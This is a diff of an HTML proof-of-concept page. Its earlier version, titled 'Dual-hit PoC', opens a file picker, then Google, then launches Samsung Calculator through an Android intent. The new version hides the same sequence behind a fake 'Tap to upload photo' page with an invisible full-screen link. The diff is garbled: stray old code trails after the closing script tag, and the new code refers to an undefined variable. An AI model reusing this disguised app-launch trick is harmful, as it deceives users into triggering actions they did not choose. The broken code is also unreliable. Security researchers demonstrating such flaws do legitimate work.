@@ -1,39 +1,40 @@
-<!doctype html>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Dual-hit PoC — Google + Calculator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-  html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif;background:#f7f8fb}
-  .wrap{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:24px}
-  button{padding:14px 18px;border-radius:10px;background:#0b63d6;color:#fff;border:0;font-size:16px;cursor:pointer}
-  .note{margin-top:14px;color:#555;max-width:640px;text-align:center}
+    h1 { margin: 1em; }
+    a { position: absolute; top: 0; left: 0; right: 0; bottom: 0; }
+    input { display: none; }
+    img { width: 100%; }
 </style>
 
-<div class="wrap">
-  <button id="go">Pick file & run dual payload</button>
-  <div class="note">
-    Tap to open the system file picker. After selecting a file this PoC will open Google in a new tab and then attempt to launch Samsung Calculator via an intent.
-  </div>
-</div>
+<h1>Tap to upload photo</h1>
+
+<input id="fileSelect" type="file" accept="image/*" />
+<img id="preview" style="max-width: 100%; margin-top: 20px;" />
+<a id="link" target="_blank"></a>
 
 <script>
-const btn = document.getElementById('go');
+link.onclick = () => {
+    showOpenFilePicker().then(([fileHandle]) => {
+        fileHandle.getFile().then((file) => {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                document.getElementById('preview').src = e.target.result;
+            };
+            reader.readAsDataURL(file);
+        });
 
-// Samsung Calculator package (common on Samsung devices)
-const samsungCalcIntent = 'intent://#Intent;action=android.intent.action.MAIN;package=com.sec.android.app.popupcalculator;end';
+        // Open Google
+        window.open("https://www.google.com", "_blank");
 
-// Small helper to open google then intent
-async function dualFlow() {
-  try {
-    // Attempt FS Access API if available (opens system picker as an activity)
-    if (window.showOpenFilePicker) {
-      await showOpenFilePicker({ multiple: false });
-    } else {
-      // fallback: create and click a hidden input[type=file]
-      const input = document.createElement('input');
-      input.type = 'file';
-      input.accept = '*/*';
-      input.style.display = 'none';
-      document.body.appendChild(input);
+        // Launch Samsung Calculator via intent
+        window.location.href = "intent://com.sec.android.app.popupcalculator#Intent;scheme=android-app;end";
+    });
+}
+
+fileSelect.onchange = (event) => {
+    img.src = URL.createObjectURL(fileSelect.files[0]);
+}
+</script>
       input.click();
       // wait for a file selection (or user cancel) — listen for change or timeout
       await new Promise((resolve) => {
